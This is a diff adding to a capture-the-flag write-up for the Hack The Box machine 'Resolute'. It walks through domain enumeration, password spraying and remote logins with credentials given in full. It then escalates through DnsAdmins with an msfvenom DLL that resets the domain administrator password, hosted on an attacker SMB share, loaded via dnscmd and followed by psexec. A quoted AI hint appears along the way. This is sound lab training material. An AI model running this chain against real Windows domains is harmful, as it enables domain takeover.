@@ -8,21 +8,29 @@
 
 ## Executive Summary
 
+This machine, `Resolute`, was enumerated by `nmap` to have LDAP, domain controller, and an HTTP server running.
 
+The MS-RPC service was queried using `rpcclient` to recover a dozen or so usernames.
+
+We then use `ldapsearch` to find a user with a `description` field containing their password. The user was `marko`.
+
+We then password spray over SMB to find that `melanie` also uses the same password as `marko`.
+
+We use `evil-winrm` as `melanie` user to find a `C:\PSTranscripts` folder containing the credentials for `ryan`.
+
+`ryan` is member of `DnsAdmins`, and we use this to inject a DLL we remotely host that changes the password of the `administrator` user to `potato123`.
+
+This succeeds, and we use SMB + MSRPC via `impacket-psexec` to logon as the `administrator` user and fully compromise the target.
 
 ### Recommendations
 
-1. a
-2. b
-3. c
+1. Do not use default passwords.
+2. Close ports and services that do not need to be exposed.
+3. Do not store passwords in description fields.
 
 ## Resources
 
-- resource1
-- github link
-- medium link
-- exploit-db link
-
+- HTB Resolute Writeup
 ## Recon
 
 Let's start with a service scan.
@@ -553,14 +561,66 @@ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
 We have `ryan` user creds.
 
 ```sh
-
 evil-winrm -i 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'
 ```
 
+Let's consult the guide again.
+
+Okay. Apparently we need to abuse `DnsAdmins` group membership.
+
+```sh
+whoami /groups
+
+<<OWO
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                            Attributes
+========================================== ================ ============================================== ===============================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
+MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+
+OWO
+```
+
+So, they're part of `DnsAdmins`. But how would I figure out this leads to a DLL loading exploit on my own?
 
 ## Root access
 
+> Claude sez: "What does this group actually control?" - `net group DnsAdmins /domain`. (Error...)
 
+Let's just continue with the guide...
+
+```sh
+msfvenom -p windows/x64/exec cmd='net user administrator potato123 /domain' -f dll > da.dll
+
+ip a | grep 10 #10.10.15.250
+
+sudo impacket-smbserver share ./
+
+# on victim...
+evil-winrm -i 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'
+
+# set remote dll to be loaded
+cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.15.250\share\da.dll
+
+# reload service
+sc.exe stop dns 
+sc.exe start dns
+
+# on attacker.
+sudo impacket-psexec megabank.local/administrator@10.129.96.155
+```
 
 ## Proof
 
@@ -580,4 +640,4 @@ evil-winrm -i 10.129.96.155 -u ryan -p 'Serv3r4Admin4cc123!'
 - `hostname`
 - `date`
 - `cat proof.txt`
-(IMG_PLACEHOLDER)
+![](Pasted%20image%2020260722220409.png)
